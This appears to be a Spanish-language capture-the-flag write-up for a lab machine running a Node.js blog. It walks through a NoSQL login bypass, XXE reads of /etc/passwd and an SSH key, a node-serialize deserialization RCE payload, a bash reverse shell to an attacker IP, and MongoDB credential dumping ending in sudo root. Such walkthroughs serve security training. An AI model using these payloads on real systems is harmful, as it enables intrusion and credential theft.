## Summary

- IP -> 10.10.11.139
- Ports -> TCP (22,5000), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    - 5000 -> http Nose.js

## Recon
❯ **nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.139  -oG allPorts**
❯ **nmap -sCV -p22,5000 10.10.11.139 -oN targeted**

* Launchpad 4ubuntu0.3 -> Bionic

Miramos la web por le puerto 5000
Encontramos un panel de login 

Por lo que probamos injecciones SQL
❯ **admin' or sleep(5)-- -** Para ver si la web tarda 5 segundos en responder pero miramos que no 

Nos disponemos a abrir Burpsuite
❯ **burpsuite &> /dev/null &** Iniciamos el BurpSuite y lo mandamos a segundo plano
❯ **disown** Para independizar el proceso del BurpSuite

Y capturamos el login ingresando lo que sea en los campos, despues lo mandamos al repeater y ahi probaremos las inyecciones 

Nos fijarnos en el **Content-Length** que en este caso de el **1040**. Vamos modificando la parte de user y passwd aplicandole SQLI 
* **Ctrl + u** para hacer que la Query se URL encodee y tal vez asi sea aceptada por la Web, pero vemos que no cambia en lo absoluto esa longitud. 

user=admin’+or+1%3d1--+- Esto es encodeado
user=admin‘) or 1=1-- - &password=admin’) or 1=1-- -
user=admin” or 1=1-- - &password=admin” or 1=1-- - 
user=admin”)+or+1%3d1--+- &password=admin”)+or +1%3d1--+-

Buscamos en Google en la pagina de GITHUB **‘Payloadsallthethings’** y filtramos por SQLI, pero como no acepta alguna inyeccion, mejor miramos No-SQLI en la parte de **Authenticationn Bypass**

user=admin &password[$ne]=man Aqui tenenemos un usuario valido y queriamos ver si aplicando el no es igual [$ne] podriamos entrar ya que la longitud de 1040 no a cambiado, por lo que podriamos hacerlo con el formato **Json**.

Para poder colocarlo en Json debemos de cambiar el **Content-type** en la primer parte, y colocarlo asi:
* **Content-type: application/jason**

Y ahora debemos de poner la data en formato json asi y ver si es aceptada por la web:

{
	“user” : “admin”,
	“password” : “man”
}

Asi seria aplicando No-SQLI
{
	“user” : “admin”,
	“password” : {“$ne”:“man”}
}

Lo acepta ya que el **content-lenght** cambia y ya no es **1040 si no ahora es 2584**, tambien miramos la bienvenida.

Dentro de la paginaweb en el navegador podemos ir a inspeccionar el codigo y en la parte de **Almacenamiento** podemos ver una **Cookie de Sesion** en la cual en su valor esta en formato **Url Encode** por lo que  si nos vamos al Burpsuite en la parte de Encode podemos pegar esa Cookie y despues en la partde derecha seleccionar **Decode as… y Colocar Url** para asi poder observar el contenido que en este caso es un usuario y firma.

❯ **pushd /home/omar/Downloads/Firefox** El comando pushd nos permitirá crear una lista o pila de directorios enumerada. 
Una vez creada la pila o lista de directorios el comando cd nos permitirá ir de forma rápida y sencilla a cualquier directorio almacenado en la pila o lista de directorios. 
❯ **popd** Para regresarnos al directorio en el que estabamos solo ponemos el comando. 

Dentro de ese directorio no creamos un archivo asi para subirlo a la web:
Nos damos cuenta que el documento que nos deja subir tiene que ser **Xml** de la siguiente manera y eso lo vimos con el **Ctrl+ u** en la pagina.

Procedemos a crear un archivo asi:
❯ **vi file.xml** 
	❮post❯
		❮title❯This is a test❮/title❯
		❮description❯Mensaje de prueba❮/description❯
		❮markdown❯Omar was here❮/markdown❯
	❮/post❯

Vemos que nos reporta lo mismo en la pagina web por lo que ahora buscamos en Google en la pagina (Payloadallthethings) de GitHub y filtramos por **XXE Injection** y nos dirigimos a la parte de **classic XXE**.

Procedemos a crear un archivo asi:
❯ **vi file.xml** 
	❮?xml version=”1.0” encoding=”ISO-8859-1”?❯
		❮!DOCTYPE foo \[
		❮!ELEMENT foo ANY❯
	❮!ENTITY xxe SYSTEM “file:////etc/passwd”❯]❯
	❮post❯
		❮title❯This is a test❮/title❯
		❮description❯Mensaje de prueba❮/description❯
		❮markdown❯&xxe;❮/markdown❯
	❮/post❯

Asi deberiamos crear el archivo donde se llama xxe y en la parte de SYSTEM es donde nosotros podemos cambiar el comando que queremos que nos ejecute la pagina web y todo nos lo mostrara en el campo markdown. 

Comandos que podemos meter en SYSTEM: 
**\file:///proc/net/fib_trie** Que nos muestra las direcciones IP que se encuetran ahi en la maquina 
**\file:///proc/net/tcp** Que nos muestra los puerto abiertos pero de manera interna, miramos que vienen en fomato hexadecimal y podemos desconvertirlos en alguna pagina web.
**\file:///etc/passwd** Ver los usuarios de la maquina 
**\file:///home/admin/.ssh/id_rsa** Tratar de listar la id_rsa de la maquina

En nuestra consola podemos meter este comando para convertir los puertos a decimal.
❯ **for port in $(cat /proc/net/tcp | awk ‘{print $2}’ | grep -v local | awk ‘{print $2}’ FS=”:” | sort -u); do echo “[+] Port $port → $(echo “obase=10; ibase=16; $port” | bc)”; done** 

Como sabiamos que es un servidor **node.js** debemos de buscar la manera de saber donde se encuentra y una manera es en Burpsuite mandar una peticion erronea para que nos de informacion de lo que trato de cargar. Por ende no muestra una ruta que en este caso es **/opt/blog/**.

Por lo que volvemos a modificar el archivo anterior y en la parte de SYSTEM colocamos lo siguiente:
**\file:///opt/blog/server.js** Esta seria la ruta por default de un servidor node.js, el cual al momento de cargar el archivo a la pagina web nos muestra informacion de Serialized. 

Nos damos cuenta que hay un **node-serialize** y ese seria la **serializacion**, esto lo hace la Cookie de la pestana de Almacenamiento.
El cual si buscamos en Google encontraremos la manera de hacer **Unserialized**.  

Por lo que procedemos a crear un campo serializado, la web nos deserializara el contenido y podremos entrar a la maquina por esa forma. Cabe mencionar que el campo con el que estaremos probando sera el de la Cookie que se encuentra en Almacenamiento. 

Buscamos en **Google (node.js deserialization attack)** y nos mostrara un articulo llamado **Exploiting Node.js** bug de la pagina **opsecx.com**. 
Para instalar el serialize en nuestra maquina metemos el siguiente comando (**npm install node-serialize**).

Entonces por medio del **Immediately Invoked Function Expresion IIFE**, al momento de serializar data si nosotros metemos unos parentesis, ejecuta ese comando antes de serializar la data.

Pero en nuestro caso debemos emitir una data serializada maliciosa donde se acontesca el IIFE para lograr inyectar un comando a nivel de sistema.

Quedaria asi nuestro unserialized:

❯ **vi unserialized.js**

	var serialize = require(‘node-serialize’);
	var payload = ‘{“rce” : “_$$ND_FUNC$$_function (){require(\’child_process\’).exec(\’ls /\’, function(error, stdout, stderr){console.log(stdout) }); }()”}’;
	serialize.unserialize(payload);

Vamos al Burpsuite y en la parte de Decoder es donde nosotros vamos a usar la linea siguiente para que nos la pueda Encodear en Url y asi meterla en la Cookie de Almacenamiento para que al momento de recargar la pagina web esta hara la deserializacion y por ende ejecutara un comando, el primer comando que vamos a probar es el de ver si nos podemos hacer un ping a nuestra maquina de atacante.

	var payload = {“rce”:“_$$ND_FUNC$$_function(){require(\’child_process\’).exec(\’ping -c 1 10.10.14.13’, function(error, stdout, stderr){console.log(stdout)});}()”} El que se modifica es el exec ya que ahi se ponen los comando que queremos que se realicen. 

44a44t24a4th8re86h2et8htr1ht3htr8jyj8j3j35jyt8yj9tjj15j30je5jet  Encodeado en formaro URL ejemplo
❯ **tcpdump -i tun0 icmp -n** Nos ponemos en escucha en la interfaz Tun0, despues pegamos el Url Enconde en la Cookie de Almacenamiento y cuando recarguemos veremos que si nos hace un ping, por lo que podemos aprovechar eso para poder hacer una revershell a nuestra maquina.

Creamos un archivo que se llame data el cual contendra el comando de la revershell.

❯ **nano data**    

	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.13/443 0>&1 

❯ **cat data | base64 -w 0, echo** Despues el archivo llamado data lo encodeamos en la consola con base64 y nos saldra lo siguiente: 535ag1a35egrae35g1a3e5g1a35er Por lo que eso lo pegamos asi en el Burpsuite:

	var payload = {“rce”:“_$$ND_FUNC$$_function(){require(\’child_process\’).exec(\’echo 535ag1a35egrae35g1a3e5g1a35er | base64 -d | bash’, function(error, stdout, stderr){console.log(stdout)});}()”} 

El que se modifica es el exec ya que ahi se ponen los comando que queremos que se realicen. (d=decoder base64) 
Una vez encodeado en Url por el Burpsuite lo pegamos en la Cookie de Almacenamiento de la pagina web y antes de recargarla para que lo lea nos ponemos en escucha por el puerto 443


## User
❯ **nc -nlvp 443** Puerto de escucha para poder hacer la revershell en nuestra maquina de atacante
❯ **whoami** Miramos el nombre del usuario
❯ **hostname -I** Para ver la IP de la maquina (I=i mayuscula)

Una vez dentro de la consola, procedemos a hacer una pseudo consola, colocando los siguientes comandos. 
**Script /dev/null -c bash 
Ctrl + z
stty raw -echo; fg 
reset xterm**
**export TERM=xterm** Despues cambiamos esto para poder hacer **Ctrl+ l y Ctrl + c** (l=ele)

Ahora para modificar las dimensiones de nano debemos hacer lo siguiente. 
stty size Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimenesiones de la consola nano 

Despues de eso entramos a la maquina y podemos ir por la flag de User.txt. Pero antes le cambiamos los privilegios al directorio admin para poder entrar y leer la flag con 
❯ **chmod +x admin/**



## Root
Ahora queda hacer la escalada de privilegios para poder ser usuario root, 
❯ **netstat -nat** Podemos ver los puertos abiertos internos y nos mostra el 27017 (Mongo) el cual podemos 

❯ **mongo** Con ese comando nos podemos conectar a mongo 
Una vez dentro de mongo hacemos lo siguiente 	
	**>help** Para ver que comando podemos usar y vemos que podemos listar bases de datos 
	**>show dbs** Listamos las bases de datos y encotramos varias como (admin,blog...)
	**>use blog** Usamos la base de datos llamada blog 
	**>show collections** Mostramos contenido y encontramos users
	**>db.users.find()** Para listar el contenido y encontramos el usuario y password
	**>bye** Salimos de mongo

o en lugar de hacer lo de arriba podemos colocar el siguiente comando:
❯ **mongodump** Nos crea el directorio dump  
❯ **ls** Listamos el contenido creado
❯ **cd dump/** Nos vamos al directorio dump y ahi miramos toda la informacion 
❯ **cd blog/** Nos metemos al directorio blog y ahi miramos los archivos en formato bson 
❯ **bsondump users.bson** Miramos el usuario y password 

❯ **sudo -l** Miramos los privilegios en el sudoers (l=ele) y le colocamos la passwd que habiamos encontrado 
Miramos que el usuario admin tiene: 
	(ALL) ALL
	(ALL : ALL) ALL 
Por lo que podemos hacer cualquier comando con sudo sin proporcionar una password y procedemos a hacer lo siguiente
❯ **sudo su** Aqui nos convertiremos en usuario root sin passwd 
Solo queda ir al dir root
**/root/root.txt** y mirar la flag de root 